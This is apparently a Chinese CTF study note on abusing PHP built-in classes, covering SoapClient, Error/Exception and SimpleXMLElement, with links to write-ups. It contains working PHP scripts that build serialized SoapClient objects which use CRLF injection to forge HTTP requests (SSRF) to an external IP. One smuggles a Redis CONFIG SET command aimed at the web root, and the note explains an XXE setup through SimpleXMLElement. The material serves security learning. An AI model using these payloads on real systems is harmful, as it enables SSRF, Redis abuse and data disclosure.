# 文章
[PHP 原生类的利用小结 - 先知社区](https://xz.aliyun.com/t/9293#toc-8)<br />[php原生类利用](https://www.extrader.top/posts/35c0085d/#Class-Found)<br />[PHP原生类在CTF当中的应用🛴](https://ch1e.gitee.io/2021/11/12/yuanshenglei/)<br />[浅析PHP原生类-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/264823)
# Error和Exception
### 触发点
`__toString()`
# SoapClient
### 触发点 
`__call()` 当调用该类不存在的方法时，会触发
### 配合CRLF漏洞进行SSRF
CRLF注入 [CRLF Injection漏洞的利用与实例分析 - phith0n](https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html)<br />一些`SoapClient`原生类序列化字符串的构造脚本，`SoapClient`只支持HTTP和HTTPS
```php
<?php
$a = new SoapClient(null, array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```
```php
<?php
$target = 'http://47.xxx.xxx.72:2333/';
$a = new SoapClient(null,array('location' => $target, 'user_agent' => "WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n", 'uri' => 'test'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```
```php
<?php
$target = 'http://47.xxx.xxx.72:6379/';
$poc = "CONFIG SET dir /var/www/html";
$a = new SoapClient(null,array('location' => $target, 'uri' => 'hello^^'.$poc.'^^hello'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b); 
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```
```php
<?php
$target = 'http://47.xxx.xxx.72:2333/';
$post_data = 'data=whoami';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$a = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```
### 例题
[bestphp’s revenge题目详解](https://xilitter.github.io/2023/04/28/bestphp-s-revenge%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/index.html)
# SimpleXMLElement
### 触发点
`__construct()`
### 参数
[PHP: SimpleXMLElement::__construct - Manual](https://www.php.net/manual/zh/simplexmlelement.construct.php)
```php
public SimpleXMLElement::__construct(
  string $data,
  int $options = 0,
  bool $dataIsURL = false,
  string $namespaceOrPrefix = "",
  bool $isPrefix = false
)
```
:::tips
**data**<br />A well-formed XML string or the path or URL to an XML document if dataIsURL is **true**.<br />**options**<br />Optionally used to specify [additional Libxml parameters](https://www.php.net/manual/zh/libxml.constants.php), which affect reading of XML 	documents. Options which affect the output of XML documents (e.g. **LIBXML_NOEMPTYTAG**) are silently ignored.<br />**注意**:<br />It may be necessary to pass [LIBXML_PARSEHUGE](https://www.php.net/manual/zh/libxml.constants.php#constant.libxml-parsehuge) to be able to process deeply nested   XML or very large text nodes.<br />**dataIsURL**<br />By default, dataIsURL is **false**. Use **true** to specify that data is a path or URL to an XML document instead of string data.<br />**namespaceOrPrefix**<br />Namespace prefix or URI.<br />**isPrefix**<br />**true** if namespaceOrPrefix is a prefix, **false** if it's a URI; defaults to **false**.
:::
可以看到通过设置第三个参数 **data_is_url** 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数 **data** 就是我们自己设置的 payload 的 url 地址，即用于引入的外部实体的 url 。<br />这样的话，当我们可以控制目标调用的类的时候，便可以通过 `SimpleXMLElement` 这个内置类来构造 XXE。
